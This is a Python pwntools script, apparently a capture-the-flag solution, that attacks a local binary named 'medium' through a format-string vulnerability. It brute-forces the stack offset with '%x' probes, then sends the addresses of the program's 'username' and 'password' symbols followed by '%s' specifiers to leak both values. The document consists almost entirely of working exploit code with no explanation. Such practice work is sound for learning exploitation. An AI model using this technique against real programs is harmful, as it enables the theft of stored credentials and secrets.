from pwn import *

context.log_level = 'error'

def find_offset():
    for i in range(1, 20):
        p = process('./medium')

        p.sendlineafter(b':\n', f'AAAA%{i}$x'.encode())
        output = p.recvline().decode('utf-8')

        p.close()

        if '41414141' in output:
            return i

offset = find_offset()

p = process('./medium')
e = p.elf

payload = p32(e.symbols['username']) + p32(e.symbols['password'])
payload += f'%{offset}$s'.encode() + f'%{offset + 1}$s'.encode()

p.sendlineafter(b':\n', payload)

p.interactive()
p.close()